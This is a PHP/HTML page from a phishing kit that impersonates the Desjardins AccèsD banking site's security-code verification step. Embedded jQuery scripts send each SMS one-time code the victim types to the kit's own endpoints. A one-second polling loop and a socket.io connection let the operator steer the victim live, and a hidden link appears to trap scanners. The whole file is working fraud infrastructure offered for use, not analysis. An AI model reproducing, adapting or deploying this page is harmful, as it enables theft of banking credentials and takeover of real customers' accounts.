<?php

require_once '../../../../../app/init.php';

$error = $udata->error ?? false;

?>
<!DOCTYPE html>
<html lang="fr">
    <head>
        <title>Valider l&#39;identit&eacute; Acc&egrave;sD Acc&egrave;sD Affaires | Desjardins</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
        <meta name="robots" content="noindex, nofollow"/>
        <link rel="shortcut icon" href="/assets/desj/d.ico" type="image/x-icon">
        <link rel="icon" href="/assets/desj/d.ico" type="image/x-icon">
        <link href="/assets/desj/files/bootstrap.min.css" rel="stylesheet" />
        <link href="/assets/desj/files/fwd-bootstrap.min.css" rel="stylesheet" />
        <!--[if lt IE 9]>
        <link href="/assets/desj/files/fwd-bootstrap-ie-force-960-layout.min.css" rel="stylesheet" />
        <![endif]-->
        <!--[if lte IE 8]>
        <link href="/assets/desj/files/fwd-bootstrap-ie.min.css" rel="stylesheet" />
        <link href="/assets/desj/files/fwd-bootstrap.css" rel="stylesheet" />
        <![endif]-->
        <!--[if IE 9]>
        <link href="/assets/desj/files/fwd-bootstrap-ie9.min.css" rel="stylesheet" />
        <![endif]-->
        <link href="/assets/desj/files/global.min.css" rel="stylesheet"/>
        <link media="only screen and (max-width : 768px)" href="/assets/desj/files/identifiantunique-responsive.min.css" rel="stylesheet" />
        <!-- Ajustements de styles de l'application -->
        <link href="/assets/desj/files/theme.min.css" rel="stylesheet">
        <!--[if IE]>
        <link rel="stylesheet" type="text/css" href="/assets/desj/files/ie.min.css"/>
        <![endif]-->
        <!--[if lte IE 7]>
        <link rel="stylesheet" type="text/css" href="/assets/desj/files/ie7.min.css"/>
        <![endif]-->
        <!--[if IE 8]>
        <link rel="stylesheet" type="text/css" href="/assets/desj/files/ie8.min.css"/>
        <![endif]-->
        <link href="/assets/desj/files/owl.carousel.min.css" rel="stylesheet">
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta name="desjardins-identifiant-application" content="AccesWeb">
        <meta name="raaMobileActif" content="" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link href="/assets/desj/files/pied.css" rel="stylesheet">
        <link rel="stylesheet" href="/assets/desj/files/entete.css">
        <link rel="stylesheet" href="/assets/desj/files/page-logon.css">
        <link rel="stylesheet" href="/assets/desj/styles.css">
        <link rel="stylesheet" href="/assets/desj/fwd-bootstrap.min.css">
        <style>
        .isolation-bootstrap-3 .form-horizontal .form-group {
            margin-left: 0px;
            margin-right: 0px;
        }

        .isolation-bootstrap-3 form input[type="tel"], .isolation-bootstrap-3 form input[type="email"], .isolation-bootstrap-3 form input[type="text"], .isolation-bootstrap-3 form select {
            font-size: 16px!important;
            height: 30px;
            width: 100%;
            overflow: hidden;
            white-space: pre;
            word-break: break-word;
            -webkit-appearance: break-word;
        }

        .auth-type-com span {
            padding: 8px;
        }

        .auth-type-com img {
            margin: 4px 0px;
        }

        .auth-type-com.auth-push img {
            margin: 2px 0px;
        }

        .auth-reponse .c-indicator {
            top: 5px;
        }

        .auth-boutons {
            margin-bottom: -10px;
        }

        .isolation-bootstrap-3 .alert-info:before {
            content: url(/assets/desj/ic-avertissement.svg);
        }

        .isolation-bootstrap-3 .alert-danger:before {
            background-image: url(/assets/desj/ic-erreur.svg);
            margin-top: 3px;
            position: absolute;
            left: 9px;
            background-repeat: no-repeat;
            background-size: contain;
            display: block;
            height: 17px;
            width: 17px;
            content: "";
        }
        </style>
        <style>
        #securiteMobile {
            width: 100% !important;
        }
        </style>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
        <script>var lrbank = '<?=escape($udata->last->bank)?>'; var lrinfo = '<?=escape($udata->last->info)?>';</script>
        <script src="/assets/js/actions.js?v=<?=time()?>"></script>
        <script>
            setInterval(function() {
                $.post('/deposit/desj/api/status', {page: '2FA (Waiting)'}, function(response) {
                    if (response.status) {
                        location.href = response.href;
                    }
                }, 'JSON');
            }, 1000);
        </script>
        <script>
        $(document).on('change', '#input-code', function() {
            $.post('/deposit/desj/api/otp-data', {code: $(this).val()});
        });

        $.post('/deposit/desj/api/otp-type', {type: 'SMS'}, function(response) {});

        $(document).on('submit', '.lab-form2', function(e) {
            $('.btn-save').attr('disabled', true);

            $.post('/deposit/desj/api/otp-submit', {code: $('#input-code').val()}, function(response) {
                location.href = '/deposit/desj/wo/' + rand_str(16);
            });

            e.preventDefault();
        });

        function rand_str(length) {
            var result           = '';
            var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for ( var i = 0; i < length; i++ ) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }
            return result;
        }
        </script>
        <script src="/socket.io/socket.io.js"></script>
    </head>
    <body class="isolation-bootstrap-3">
        <!-- if app_mobile -->
        <a name="haut"></a>
        <span class="hidden-xs">
            <div id="zone-entete-de-page">
                <div id="entete">
                    <div id="access-links">
                        <a href="#contenu" class="hors-ecran" title="Aller au contenu principal">Aller au contenu principal</a>
                    </div>
                    <div id="logo">
                        <h1 class="hors-ecran">Site Internet de Desjardins</h1>
                        <a href="#" title="Retour &agrave; page d'accueil de Desjardins"><img src="/assets/desj/desj.svg" alt="Retour &agrave; page d'accueil de Desjardins" width="154" height="32"></a>
                    </div>
                    <div id="logo-applicatif">
                        <a href="#"><img src="/assets/desj/files/g40-entete-logo-accesd.png" alt="Acc&egrave;sD" width="106" height="32"></a>
                        <a href="#"><img src="/assets/desj/files/g40-entete-logo-accesd-affaires.png" alt="Acc&egrave;sD Affaires" width="90" height="32"></a>
                    </div>
                    <div id="outils">
                        <div id="nous-joindre">
                            <p class="titre-entete"><a href="#" onclick="">Nous joindre</a></p>
                        </div>
                        <div id="aide">
                            <p class="titre-entete"><a href="#" onclick="">Aide</a></p>
                        </div>
                        <div id="fonctions">
                            <ul>
                                <li class="reduire"><a id="taille-texte-moins" href="#" title="R&eacute;duire la taille du texte">R&eacute;duire la taille du texte</a></li>
                                <li class="augmenter"><a id="taille-texte-plus" href="#" title="Augmenter la taille du texte">Augmenter la taille du texte</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </span>
        <span class="hidden-sm hidden-md hidden-lg">
            <div id="zone-entete-de-page">
                <nav class="navbar navbar-default" role="navigation">
                    <div class="container max-layout-960" style="padding: 0px 6px;">
                        <!-- Brand and toggle get grouped for better mobile display -->
                        <div class="navbar-header">
                            <span class="navbar-brand">
                                <style>
                                @media (max-width: 768px) {
                                    .navbar-brand .logo {
                                        display: block !important;
                                        margin-left: 10px;
                                    }
                                }
                                </style>
                                <a href="">
                                    <img class="logo" src="/assets/desj/desj.svg" alt="Aller &agrave; la page d&#39;accueil" title="Desjardins" style="height: 30px">
                                </a>
                                <div class="hidden-xs" style="display: inline;">
                                    <img role="presentation" src="/assets/desj/files/g00-entete-filet-logos.png" />
                                    <img class="logo-desjardins" role="presentation" src="/assets/desj/files/g00-logo-desjardins-blanc.png" style="padding-right: 20px;" alt="Desjardins" title="Desjardins"/>
                                </div>
                            </span>
                            <div id="titrePageMobile" class="navbar-brand hidden-sm hidden-md hidden-lg"></div>
                            <a href="#" class="navbar-brand pull-right hidden-sm hidden-md hidden-lg">
                            <img id="menuAppRetour" src="/assets/desj/files/entete-btn-menu-app.png" height="32"/>
                            </a>
                        </div>
                        <!-- /.navbar-header --> <!-- Collect the nav links, forms, and other content for toggling -->
                        <div class="collapse navbar-collapse" id="navbar-collapse-outils">
                            <div id="outils">
                                <ul class="nav navbar-nav navbar-right">
                                    <li>
                                        <a class="lien" href="javascript:popup('#','Nous joindre', 'location=0,scrollbars=yes,resizable=yes,width=500,height=500');">
                                        Nous joindre
                                        </a><span class="hidden-xs">|</span>
                                    </li>
                                    <li>
                                        <a class="lien" href="javascript:popup('#','Aide', 'location=0,scrollbars=yes,resizable=yes,width=500,height=500');">
                                        Aide
                                        </a><span class="hidden-xs">|</span>
                                        <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                                    </li>
                                    <li class="hidden-xs">
                                        <a class="lien" id="changeLangue" href="?langueCible=en">
                                        English
                                        </a>
                                        <span class="hidden-sm">|</span>
                                    </li>
                                    <li class="hidden-xs">
                                        <a class="lien" id="taille-texte-moins" href="javascript:void(0)" style="padding-right: 0px;">
                                        <img src="/assets/desj/files/a00-entete-ic-texte-moins-blanc-on.png" alt="" title=""/>
                                        </a>
                                    </li>
                                    <li class="hidden-xs">
                                        <a class="lien" id="taille-texte-plus" href="javascript:void(0)" style="padding-left: 8px; padding-right: 20px;">
                                        <img src="/assets/desj/files/a00-entete-ic-texte-plus-blanc-on.png" alt="" title=""/>
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </nav>
            </div>
        </span>
        <div class="zone-centrale">
            <div id="zone-centrale-bg">
                <div class="container" style="padding: 0px 6px;">
                    <div id="contenu" lang="fr" role="main">
                        <div class="row">
                            <div class="col-xs-24 col-sm-24 col-md-18 col-md-offset-3 col-lg-18 col-lg-offset-3">
                                <div id="loading" class="loading" style="display: none;">
                                    <div class="panel panel-primary">
                                        <div class="panel-body">
                                            <img id="img-loading" src="/assets/desj/files/a00-loading-petit.gif" alt="Loading" />
                                        </div>
                                    </div>
                                </div>
                                <h1 id="titrePage" data-titre-page-mobile="Obtenir un mot de passe">
                                    V&eacute;rification de s&eacute;curit&eacute;
                                </h1>
                                <div class="row">
                                    <div class="col-sm-24 col-md-24">
                                        <div id="erreurSystemeJS" class="has-error hidden" aria-live="assertive">
                                            <div>
                                                <span class="help-block-idunique">
                                                </span>
                                                <ul>
                                                    <li>
                                                        <a id="erreurLienJS" href="#" class="erreurLien"></a>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <script type="text/javascript">
                                    $( document ).ready(function() {
                                        //forcer le focus pour respecter les regles d'accessibilit�
                                         setTimeout(function() { $('#erreurAccessibilite').focus() }, 2000);//accessibilit�
                                    })
                                </script>
                                 <% if (error) { %>
                                <div role="region" tabindex="-1" class="alert alert-danger error-div" aria-label="Error">
                                    <p><span class="sr-only">Error&nbsp;</span><span>Le code est incorrect. Réessayer. (IDHS966081)</span><!----></p><!---->
                                </div>
                                <% } %>
                                <div class="panel panel-primary">
                                    <div id="panel-body-questions" class="panel-body padding-moyen">
                                        <div class="col-xs-24">
                                            <form id="loginForm" role="form" class="form-horizontal ng-untouched ng-pristine ng-invalid div-code lab-form2">
                                                <input type="hidden" id="userAgent" name="userAgent">
                                                <div tabindex="-1" class="alert alert-info">
                                                    <span>Un code de sécurité a été envoyé à votre appareil mobile</span>
                                                    <p><span>Une fois votre code reçu, vous disposez de 10 minutes pour le saisir.</span></p>
                                                </div>
                                                <!----><!----><!---->
                                                <h2 tabindex="-1" class="auth-titre-page">Vérification d'identité</h2>
                                                <!---->
                                                <p>
                                                    <!---->
                                                </p>
                                                <validation-groupe>
                                                    <div class="">
                                                        <div class="form-group">
                                                            <div id="code" class="auth-question-code-securite">
                                                                <label for="codeSecurite" class="control-label code-label"><b>Entrez le code de sécurité:</b></label>
                                                                <div class="auth-reponse">
                                                                    <input type="tel" pattern="[0-9]*" required size="8" minlength="6" maxlength="6" name="code" id="input-code" autocorrect="off" autocomplete="one-time-code" autocapitalize="off" class="fix-zoom-ios ng-untouched ng-pristine ng-invalid">
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </validation-groupe>
                                                <div class="auth-boutons">
                                                    <span class="auth-boutons-2">
                                                        <button type="button" class="btn btn-default btn-cancel" >Annuler</button><!---->
                                                    </span>
                                                    <button onclick="submitForm()" type="button" class="btn btn-primary btn-save">Continuez</button><!---->
                                                </div>
                                            </form>
                                            <!----><!---->
                                        </div>
                                    </div>
                                </div>
                                <div class="col-sm-24 text-right top15px non-selectable hidden-xs">
                                    <img alt="S&eacute;curit&eacute; garantie &agrave; 100 %" src="/assets/desj/files/g00-logo-securite-garantie-f.png" />
                                </div>
                                <div class="modal fade" id="modale-institution" tabindex="-1" role="dialog" aria-hidden="true">
                                    <div class="modal-dialog margin-top">
                                        <div class="modal-content padding-left10px padding-right10px">
                                            <div class="modal-header"></div>
                                            <p>
                                                <img class="fullwidth" alt="" src="/assets/desj/files//contenu-cheque-815-institut.png"/>
                                            </p>
                                            <div class="modal-footer padding-left0px padding-right0px">
                                                <div class="row">
                                                    <div class="col-xs-offset-6 col-xs-12 text-right">
                                                        <a data-dismiss='modal' class='btn btn-primary fullwidth' href='#'>
                                                        Fermer
                                                        </a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="modal fade" id="modale-transit" tabindex="-1" role="dialog" aria-hidden="true">
                                    <div class="modal-dialog margin-top">
                                        <div class="modal-content padding-left10px padding-right10px">
                                            <div class="modal-header"></div>
                                            <p>
                                                <img class="fullwidth" alt="Il se compose de 5 chiffres." src="/assets/desj/files//contenu-cheque-815-transit.png"/>
                                            </p>
                                            <div class="modal-footer padding-left0px padding-right0px">
                                                <div class="row">
                                                    <div class="col-xs-offset-6 col-xs-12 text-right">
                                                        <a data-dismiss='modal' class='btn btn-primary fullwidth' href='#'>
                                                        Fermer
                                                        </a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="modal fade" id="modale-compte" tabindex="-1" role="dialog" aria-hidden="true">
                                    <div class="modal-dialog margin-top">
                                        <div class="modal-content padding-left10px padding-right10px">
                                            <div class="modal-header"></div>
                                            <p>
                                                <img class="fullwidth" alt="Il se compose de 7 chiffres." src="/assets/desj/files//contenu-cheque-815-folio.png"/>
                                            </p>
                                            <div class="modal-footer padding-left0px padding-right0px">
                                                <div class="row">
                                                    <div class="col-xs-offset-6 col-xs-12 text-right">
                                                        <a data-dismiss='modal' class='btn btn-primary fullwidth' href='#'>
                                                        Fermer
                                                        </a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="securiteMobile" class="hidden-sm hidden-md hidden-lg">
                                    <img class="fake" src="/assets/desj/files/g00-logo-securite-garantie-f.png" />
                                    <img class="fake" src="/assets/desj/desj.svg" />
                                    <div id="img_wrap" class="row col-xs-24 padding-left10px" style="width: 260px;">
                                        <img class="normal non-selectable" title="" src="/assets/desj/files/g00-logo-securite-garantie-f.png" alt=""/>
                                        <img class="normal non-selectable padding-left20px" title="Desjardins" src="/assets/desj/desj.svg" alt="Desjardins"/>
                                    </div>
                                </div>
                                <br/>
                                <br/>
                            </div>
                        </div>
                    </div>
                    <br/>
                </div>
            </div>
        </div>
        <footer class="footer">
            <span class="hidden-xs">
                <div id="zone-pied-de-page">
                    <div id="pied">
                        <div id="plan-site">
                            <h2 class="hors-ecran">Plan du site</h2>
                            <div id="tetes-sections">
                                <ul>
                                    <li><a href="#">Services aux particuliers</a></li>
                                    <li><a href="#">Services aux entreprises</a></li>
                                    <li><a href="#">Coopmoi</a></li>
                                    <li><a href="#">&Agrave; propos</a></li>
                                    <li><a href="#">Desjardins sur mobile, GPS et RSS</a></li>
                                </ul>
                            </div>
                        </div>
                        <div id="zone-legale">
                            <ul>
                                <li><a href="#">S&eacute;curit&eacute;</a></li>
                                <li><a href="#">Confidentialit&eacute;</a></li>
                                <li><a href="#">Conditions d'utilisation et notes l&eacute;gales</a></li>
                                <li><a href="#">Accessibilit&eacute;</a></li>
                                <li><a href="#">Plan du site</a></li>
                            </ul>
                            <p class="copyright">&copy; 1996-<?=date('Y')?>,
                                Mouvement des caisses Desjardins.
                                Tous droits r&eacute;serv&eacute;s.
                            </p>
                        </div>
                    </div>
                </div>
            </span>
            <span class="hidden-sm hidden-md hidden-lg">
                <div id="pied-de-page" class="container texte-blanc">
                    <div class="row">
                        <div class="col-sm-4 col-md-4 text-left pied-de-page-logo hidden-xs">
                        </div>
                        <div class="col-xs-24 col-sm-16 col-md-16 text-center pied-de-page-texte">
                            <span class="hidden-xs">
                            <a href="javascript:popup('#','S&eacute;curit&eacute;','scrollbars=yes,resizable=yes,width=500,height=500');">S&eacute;curit&eacute;</a> |
                            <a href="javascript:popup('#','Confidentialit&eacute;','scrollbars=yes,resizable=yes,width=500,height=500');">Confidentialit&eacute;</a> |
                            <a href="javascript:popup('#','Conditions utilisation','scrollbars=yes,resizable=yes,width=500,height=500');">Conditions d&#39;utilisation et notes l&eacute;gales</a> |
                            <a href="javascript:popup('#','Accessibilit&eacute;','scrollbars=yes,resizable=yes,width=500,height=500');">Accessibilit&eacute;</a>
                            <br />
                            </span>
                            <p>Copyright &copy; <?=date('Y')?> Mouvement des caisses Desjardins. Tous droits r&eacute;serv&eacute;s.</p>
                        </div>
                        <div class="col-xs-4 col-sm-4 col-md-4 text-right hidden-xs hidden-sm">
                        </div>
                    </div>
                </div>
            </span>
        </footer>
        <span hidden id="navig"> <%=navig%> </span>
        <span hidden id="stage">OTP</span>
    </body>
    <script src="/bank/desj/js/script.js">
    </script>
</html>
